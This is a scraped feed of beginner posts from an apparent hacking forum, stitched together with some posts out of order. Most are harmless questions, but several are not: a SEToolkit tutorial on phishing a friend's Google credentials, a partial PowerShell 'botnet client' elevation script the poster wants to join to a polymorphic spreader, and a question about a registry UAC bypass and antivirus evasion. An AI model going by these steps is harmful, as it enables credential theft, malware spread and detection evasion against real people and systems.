          <title>Ethical Hacking - Extreme Noob - Need Guidance (Where to correctly start?)</title>
          <dc:creator><![CDATA[RookieEthicalHacker]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p><em>Hello World!</em><br>
You will read a lot of stupid questions from this rookie here ^^<br>
After one week of research I have decided that I want to become an Ethical Hacker!</p>
<ul>
<li>I have absolute zero knowledge when it comes to coding in any language, understanding ethical<br>
hacking properly and its tools for each different area in our digital world.<br>
I have been googling a ton, using ChatGPT for many, many questions and I always ended up in a<br>
rabbit hole because there is so much to know about and learn and I have no understanding on<br>
how it all works and where I should start so it becomes overwhelming.</li>
<li><strong>Where do I start? What do I want to achieve?</strong><br>
Well, in my mind I have this picture of helping the ones that no one else is seeing, that are left alone.<br>
I dream about helping the ones that can not help themselves in a difficult position because of higher powers.</li>
</ul>
<p><em><strong>Example:</strong></em> (The Iranian government censur and filter their network for its civilian. During a protest about Jina Mahsa Amini, the girl who got killed by a government morale-police because she was not wearing her hijab/headscarf properly according to them.<br>
Protest began and the government shot down its own network so that people can not upload/share what is happening during the protest.)<br>
So, what happened was some ethical hacker hacked the street cameras and recorded the incidents that happened on the streets and uploaded on the net to the world to see.</p>
<p><em><strong>Example:</strong></em> Lets say a friend of mine owns an animal store and has a website for the store.<br>
The website gets hacked by someone and no one is able to visit the site or the website is showing something else.</p>
<ol>
<li><em><strong>QUESTION:</strong></em> If I knew how to correctly ethically hack those two above, would I need same IT knowledge and tools? Or would I need totally different knowledge/materials for one and each?</li>
<li><em><strong>QUESTION:</strong></em> If I worked for my local Police Department would that then require some other coding language, IT knowledge and other tools if they for example want me to ethical hack someones mobile-phone who is suspicious for being a spy and is a threat according to the government?</li>
</ol>
<ul>
<li>You see, I am trying to understand a bigger picture in this and build a wider perspective around my head while moving towards being an Ethical Hacker.</li>
<li>Also I am trying to move towards my goal in an efficient way rather than trying to learn everything at the same time or maybe learning wrong areas that is not very necessary for an absolute beginner.<br>
That is the main reason I came to this reddit channel in hope to be guided at least the smallest.<br>
Hopefully I can join a local university and expand my knowledge, but until then self learning is in progress.</li>
<li><em><strong>GUIDANCE:</strong></em> I need you guys to guide me understand the very basic fundamentals to begin with.<br>
With that I mean <strong>What books/video/website/App</strong> would you recommend me to start with and in which area? (I do not mind books with hundreds of pages).<br>
Maybe recommend a book that you wish was available when you was a beginner starting Ethical Hacking. Share me your beginner experience.<br>
Do I need to learn about IT/computer and its history first?<br>
Do I need to learn about coding first?<br>
Imagine that I time traveled from 1500’s and have no clue on from where I should start, but somehow I knew that I want to become an ethical hacker x).</li>
</ul>
<p>If you have any other questions feel free to ask!<br>
Thank you very much all to all of you in advance and greetings from this cold and snowy Sweden!</p>

          <title>.Webp hidden Json</title>
          <dc:creator><![CDATA[Lorakai]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>I had a quick question, doing a hacking challenge to find a flag hidden in a picture. Pretty easy right? Yeah, not so much as it turns out the picture isn’t a .mpeg . jpeg or anything like that but instead is a .Webp file which contains a hidden json. So question is, how would I go about obtaining the flag? The first part of the challenge was extremely easy as it was just the picture below<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/6/56149ae20d4d54f03d2aaadec90189259b43df7b.webp" data-download-href="/uploads/short-url/chvcVrF18xqVCDSbRlMWipnjf8n.webp?dl=1" title="0_QQddVYwBMORnqepp" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/6/56149ae20d4d54f03d2aaadec90189259b43df7b_2_690x99.webp" alt="0_QQddVYwBMORnqepp" data-base62-sha1="chvcVrF18xqVCDSbRlMWipnjf8n" width="690" height="99" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/6/56149ae20d4d54f03d2aaadec90189259b43df7b_2_690x99.webp, https://0x00sec.s3.amazonaws.com/optimized/3X/5/6/56149ae20d4d54f03d2aaadec90189259b43df7b_2_1035x148.webp 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/6/56149ae20d4d54f03d2aaadec90189259b43df7b.webp 2x" data-dominant-color="3D5A3D"></a></div><br>
It’s not a normal/typical looking picture so my thoughts were it was sort of like a barcode so I analyzed the different color(s)/shade(s) and converted it to hex which provided me with the following:<p></p>
<p>Gl@54G$v#4$uPn4Tm@4h</p>
<p>This is NOT the flag, as flag format will be flag{foundFlagHere}. So I popped the into my terminal and typed file nameOfFile which showed it was a webP file. I was still not sure what to do, however I noticed that when I went to “View downloads” (on my phone) I noticed that unlike the typical picture which usually shows the actual picture you downloaded I noticed this one was different as it showed up as the picture below.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/0/60b0b626fcf827714b9ab183f5b558f4fe83799f.png" data-download-href="/uploads/short-url/dNmrgSzPnd3ckEdQIRKzA80YC9V.png?dl=1" title="Screenshot_20231027-185035" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/0/60b0b626fcf827714b9ab183f5b558f4fe83799f_2_512x500.png" alt="Screenshot_20231027-185035" data-base62-sha1="dNmrgSzPnd3ckEdQIRKzA80YC9V" width="512" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/0/60b0b626fcf827714b9ab183f5b558f4fe83799f_2_512x500.png, https://0x00sec.s3.amazonaws.com/original/3X/6/0/60b0b626fcf827714b9ab183f5b558f4fe83799f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/0/60b0b626fcf827714b9ab183f5b558f4fe83799f.png 2x" data-dominant-color="30236C"></a></div><br>
So, obviously something else is going on with that picture. After some time spent thinking and tinkering I came to the conclusion that the picture actually contains a hidden json file.<br>
Long story short, somehow I have to take the key I obtained earlier (Gl@54G$v#4$uPn4Tm@4h) and enter it in, either the picture somehow or json (I converted the Webp picture to json). So, how would I obtain the actual key in a webP file?<p></p>

            <p>Hi everyone,<br>
I’m KlyntarX <em>I’m not really into telling my real name</em> I’m 13 years old and I really like learning <em>You can say I’m a huge nerd</em> I came to Sweden for studies and I got myself a new keyboard. Back in my country, I had a 135 wpm where the keyboard layout was the regular QWERTY keyboard layout. This question is not related to hacking or penetration testing or anything I just want to ask How can I improve my typing speed if I have to change the layout? Can you guys tell me the most effective way to improve my typing speed to the same level as before? I know there is like 1 million YouTube videos that cover this topic but I don’t really think that’s the most effective way to keep a consistent typing speed.</p>

            <p>I’m new to hacking and I keep hearing about how white hat hackers and black hat hackers are able to penetrate company and government networks. The part of this process I don’t really know is how black hat hackers and white hat hackers are able to find the IP addresses of the machines in these networks on the internet when they are first attempting to penetrate these networks without the use of social engineering. It would be really helpful if I could have any information on the techniques used to identify the IP addresses hackers want to target on the internet.</p>

          <description><![CDATA[
            <p>Hello everyone, I am currently learning about the D/Invoke mechanism in C# and I am reading these two articles: <a href="https://thewover.github.io/Dynamic-Invoke/" class="inline-onebox" rel="noopener nofollow ugc">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks) – The Wover – Red Teaming, .NET, and random computing topics</a> and <a href="https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/" class="inline-onebox" rel="noopener nofollow ugc">Migrating from P/Invoke to D/Invoke | CyberSecurity Blog</a>. In the articles, the authors use the project <a href="https://github.com/cobbr/SharpSploit" class="inline-onebox" rel="noopener nofollow ugc">GitHub - cobbr/SharpSploit: SharpSploit is a .NET post-exploitation library written in C#</a>. Now I want to implement the code in the articles, but I found that if I compile SharpSploit into a DLL and then load it in my project, the executable file can be executed correctly in the compilation output directory, but if I move the compiled executable file to another Windows machine, it will result in an error. Then I tried moving the SharpSplot source code directly into my project directory, but it cannot be compiled correctly. Can someone help me figure out how to use the SharpSploit source code in my project? I am using VS2019. <img src="https://0x00sec.org/images/emoji/twitter/smiling_face_with_tear.png?v=12" title=":smiling_face_with_tear:" class="emoji" alt=":smiling_face_with_tear:" loading="lazy" width="20" height="20"></p>

            <p>Hello,<br>
How can I find the email addresses of a domain? For example, I want to know what e-mails are there with domain name “<a href="http://example.com" rel="noopener nofollow ugc">example.com</a>”.<br>
Can I use Telnet tool for this purpose?<br>
I did:</p>
<pre><code class="lang-auto">$ nc -v "MyTarget.com" 110
nc: timeout while connecting to X-X-X-X.ptr4.stackcp.net (X.X.X.X) 110 [pop3]
nc: 2a07:7800::152 (2a07:7800::152) 110 [pop3] open</code></pre>
<p>Other ports are open too:</p>
<pre><code class="lang-auto">nc: 2a07:7800::152 (2a07:7800::152) 995 [pop3s] open
nc: 2a07:7800::152 (2a07:7800::152) 993 [imaps] open
nc: 2a07:7800::152 (2a07:7800::152) 465 [submissions] open
nc: 2a07:7800::152 (2a07:7800::152) 143 [imap2] open
nc: 2a07:7800::152 (2a07:7800::152) 110 [pop3] open
nc: 2a07:7800::152 (2a07:7800::152) 25 [smtp] open</code></pre>
<p>I don’t like to use some tools like theHarvester.</p>

          <description><![CDATA[
            <p>Hello, I’m new to this Hacking Community. I came here to ask, how does one combine two powershell scripts? I have two scripts: One is a Botnet client, and the other is a polymorphic spreader script. Here is the botnet client:</p>
<pre><code class="lang-auto">
#first we elevate the script to admin level
# Get the ID and security principal of the current user account
$myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
$myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)

# Get the security principal for the Administrator role
$adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator

# Check to see if we are currently running "as Administrator"
if ($myWindowsPrincipal.IsInRole($adminRole)){
   # We are running "as Administrator" - so change the title and background color to indicate this
   $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Elevated)"
   $Host.UI.RawUI.BackgroundColor = "DarkBlue"
   clear-host
   }else{
   # We are not running "as Administrator" - so relaunch as administrator
   
   # Create a new process object that starts PowerShell
   $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
   
   # Specify the current script path and name as a parameter
   $newProcess.Arguments = $myInvocation.MyCommand.Definition;
   
   # Indicate that the process should be elevated
   $newProcess.Verb = "runas";
   
   # Start the new process
   [System.Diagnostics.Process]::Start($newProcess);
   
   # Exit from the current, unelevated, process
   exit
}

            <p>Wow, I suppose this was a long time coming. A question I have been waiting to ask; where do I go from here?<br>
A bit of background… I have been spending all of my free time for the last three-ish years trying all I can to learn computer programming/computer hacking and I have made some decent headway, even looking at colleges to attend for a computer science degree here in the coming year. But the thing I run into are trepidations and roadblocks which inhibit me, and I feel like I’m stuck running in circles. I would love to see myself become a “student” of sorts to a mentor, to help guide me along, keep me on track and on target. Can anybody help? Maybe point me in the proper directions? I would love to hear from anybody who would like to mentor me, I’m easy to teach to. Any input would be amazing, thank you!</p>

            <p>First, thank you for having time to read (and even comment!) on my topic today. The whole topic of coding, programming, and cybersecurity has been astronomically increasing in trend over the last couple of years. Here’s the issue, trends are typically and eventually hogged by online revenue makers - aka content creators- leaving all the useful information like a needle in a sh*t load of useless content. Why am I bringing this up? Because I want to share my findings of some sources that were quiet interesting, and I would love if I get recommendations in return!<br>
The goal here, and as it was for me 6 months ago, was to be well rounded and informed in the cybersecurity topic. In addition to that, I wanted to learn a computer “language”; thus my choice was Python for different personal reasons!</p>
<ul>
<li>TryHackme : very interesting website, I consider myself fairly informed, and found how these people treat you amazing. They’re literally acting like they have a journey to teach, a stick. Literally!! This really helps them put every little detail you should have known or will be knowing upfront. Starting out with the simplest terms and ideas, and building upon it. With great paths to choose from, and even many rooms and topics to try. Finally they have their own vm for you to experiment with, very interactive!<br>
For python, to be honest I’ve been jumping from YouTube videos to browser links, trying to scrape as much useful info as I can on a note sheet. If you have some good resources and recommendations, I would highly appreciate it.</li>
</ul>
<p>Overall, after 6 months between being lost and slowly progressing, I ended up on this forum, still motivated and hungry for help <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"><br>
So my advice, watch for the time wasting content, schedule your time and track your progress, good luck!<br>

</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/6/96501e4a933da5e774eb96ed2b064e516cc8cab3.png" data-download-href="/uploads/short-url/lrJgWwahPOmvcKyAiK05LpjkaEH.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/96501e4a933da5e774eb96ed2b064e516cc8cab3_2_293x500.png" alt="image" data-base62-sha1="lrJgWwahPOmvcKyAiK05LpjkaEH" width="293" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/96501e4a933da5e774eb96ed2b064e516cc8cab3_2_293x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/96501e4a933da5e774eb96ed2b064e516cc8cab3_2_439x750.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/96501e4a933da5e774eb96ed2b064e516cc8cab3_2_586x1000.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/96501e4a933da5e774eb96ed2b064e516cc8cab3_2_10x10.png"></a></div><p></p>
<p>See? It seems so real, there aren’t any security problems displayed on it. The URL bar displaying the title alternatively the URL itself. We understand the silly will apprehend this as the original Google page. So, i bring my cell smartphone, and stroll into my buddy, and communicate to him as though i failed to login to Google and act if I am thinking if Google crashed or errored. I deliver my telephone and ask him to try to login the usage of his account. He doesn’t trust my phrases and at once starts offevolved typing in his account statistics as though not anything will manifest badly here. Haha.</p>
<p>He already typed all the required forms, and let me to click the Sign in button. I click the button… Now It is loading… And then we got Google search engine main page like this.<br>
Once the victim clicks the Sign in button, it will send the authentication information to our listener machine, and it is logged.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/5/05428694d26c0fa008e91b74e6fb95c3880ff207.png" data-download-href="/uploads/short-url/KwUUT4evvN5S8d7GJwYSzXhVZl.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/5/05428694d26c0fa008e91b74e6fb95c3880ff207.png" alt="image" data-base62-sha1="KwUUT4evvN5S8d7GJwYSzXhVZl" width="690" height="469" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/5/05428694d26c0fa008e91b74e6fb95c3880ff207_2_10x10.png"></a></div><br>
Nothing is going on, i tell him, the Sign In button remains there, you did not login even though. And then i’m beginning again the phising page, at the same time as some other friend of this silly coming to us. Nah, we were given every other sufferer.<p></p>
<p>Until i cut the communicate, then i go returned to my table and check the log of my SEToolkit. And if you followed it correctly you should have a username and password highlighted in red.</p>
<p>And we are done! Thank you for viewing this tutorial.</p>

          <description><![CDATA[
            <p>Hello everyone. I have recently installed the SEToolkit and King Phisher and thought it would be useful if I showed you guy’s how to do it to if you wanted to learn these tools. Lets get started!</p>
<p><strong>Installing the tool:</strong>     Here are the commands to properly install the SEToolkit from GitHub.</p>
<pre><code class="lang-auto">sudo apt-get install git
git clone https://github.com/trustedsec/social-engineer-toolkit/ set/

cd set
pip install -r requirements.txt
</code></pre>
<p>Next you will go into your terminal and type</p>
<pre><code class="lang-auto">setoolkit
</code></pre>
<p>It will then open the terms and agreements. If you want to use the tool you will type Y into the prompt.</p>
<p>You will then encounter a menu that shows you the following<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/9/6/968ae8d0ad05d1ed472afc12dffcfa3baf7f9fdd.png" alt="image" data-base62-sha1="ltLeqkMoX8Um0DA2hol4QBx5HVr" width="611" height="265"></p>
<p>In this tutorial you will type in the first option (1) and hit enter.</p>
<p>In the next part of the menu you will see the following:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/9/f/9fa0c7de319ce52cf12a01117a9ef43e14472dc4.png" alt="image" data-base62-sha1="mM8o74fQjSqrblO65t4wWbiddMo" width="611" height="310"></p>
<p>you will then select the second option which is Website Attack Vectors.</p>
<p>You will then select number 3 from the menu below:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/4/4/44f7d4e2f522afdd5fa20a3bce89e92d52528ada.png" alt="image" data-base62-sha1="9Q7rzv2gE7UOvmCcrzT8guEs0gq" width="611" height="310"></p>
<p>Further options are narrower, SET has pre-formatted phishing page of popular websites, such Google, Yahoo, Twitter and Facebook. Now choose number 1. Web Templates .<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/5/b/5b9391bccb064fba917f61ddb50c664f8ff961b9.png" alt="image" data-base62-sha1="d47CaaPwaQUmvrbCzNHiL4XlGEp" width="611" height="355"></p>
<p>Because, my Kali Linux PC and my mobile phone were in the same Wi-Fi network, so just input the attacker ( my PC ) local IP address. And hit ENTER.</p>
<p>PS: To check your device IP address, type: ‘ifconfig’<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2a932c2608760aad84e0ab85d54b270010de6582.png" alt="image" data-base62-sha1="64DmTyc7qqNzTzR7ZqEnTfD4CxY" width="688" height="145"></p>
<p>Alright so far, we have set our method and the listener IP address. In this options listed pre-defined web phising templates as i mentioned above. Because we aimed Google account page, so we choose number 2. Google. Hit ENTER.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/5/3/53aa866b0bf1980fd342f37b2e256cd44d4dec79.png" alt="image" data-base62-sha1="bW8YEGEcMtUc9jL0cLwEkDabh7r" width="632" height="190"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/3/7/3704003adc9b4032f6c3d694abb63a7c3521e93a.png" alt="image" data-base62-sha1="7QGPD7TJUMhQT1qGGfN6oBHMu0O" width="632" height="220"><br>
Now, SET starts my Kali Linux Webserver on port 80, with the fake Google account login page. Our setup is done. Now i am ready walking into my friends room to login into this phishing page using my mobile phone.</p>

          <title>Using Direct sys calls and AV still detecting the malicious by exe</title>
          <dc:creator><![CDATA[mose3c]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>Hi , iam new in reverse engineering .<br>
but iam trying to learn from internet sources<br>
One of famous AV technique to monitor malware activities by injecting a DLL inside target process<br>
then make hook in Nt functions and  then check on function argument if it’s make malicious activities</p>
<p>My Problem .<br>
While iam c++ developer iam trying to edit registery and exploit some windows 10 exploit to esclate privilage . using c++ :<br>
the target key<br>
HKEY_CURRENT_USER\SOFTWARE\Classes\ms-settings\shell\open\command</p>
<p>and when i make changes using NtSetValueKey</p>
<p>the KasperSky terminate my process after the value has been set .<br>
so the vulnerability is exploited successfully , but the process is terminated by KasperSky Antivirus</p>
<p>And when iam trying to disassmble the Function if there some hoook from Av it should make<br>
Jmp 0x000 or some thing like this .</p>
<p>but the problem there is no Hook on  NtSetValueKey and function in dissasembler is the same in IDA.</p>
<p>By the way i try Direct sys calls using ASM and C++ . and KasperSky Catch me Again and again</p>
<p>Even there no NtFunctions to hook .</p>
<p>My Question .<br>
Is this problem Becouse Of Kernal-Mode hooking or some thing like this</p>
<p>My operating system Windows 10 64bit so there a Patch Guard Protection.</p>
<p>thanks in advanced .</p>

            <p>So I’m in a situation where Responder could be useful but I somehow remember hearing that i could take down the network with the LLMNR poisoning.</p>
<p>Would running Responder WPAD to certain targeted machines pose a real risk of taking down the infra?</p>
<p>thanks!<br>
